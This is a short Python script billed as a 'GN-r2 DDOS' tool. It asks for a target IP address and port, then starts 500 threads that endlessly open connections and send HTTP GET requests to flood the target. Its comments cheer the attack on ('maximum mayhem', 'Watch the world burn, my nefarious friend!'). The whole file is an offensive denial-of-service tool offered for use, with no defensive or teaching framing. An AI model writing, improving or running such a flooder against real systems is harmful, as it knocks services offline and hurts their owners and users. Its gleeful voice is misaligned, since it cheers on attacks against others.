import socket
import threading
import os

os.system("clear")
os.system("figlet GN-r2 DDOS")
target_ip = input("Enter the target's IP: ")
target_port = int(input("Enter the target's port: "))

# Function to send a flood of requests
def ddos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode("ascii"), (target_ip, target_port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode("ascii"), (target_ip, target_port))
            s.close()
        except socket.error:
            pass

# Prepare the threads for maximum mayhem
threads = []

# Adjust the thread count to intensify the onslaught
for _ in range(500):
    thread = threading.Thread(target=ddos)
    thread.daemon = True
    threads.append(thread)

# Launch the attack!
for thread in threads:
    thread.start()

# Watch the world burn, my nefarious friend!
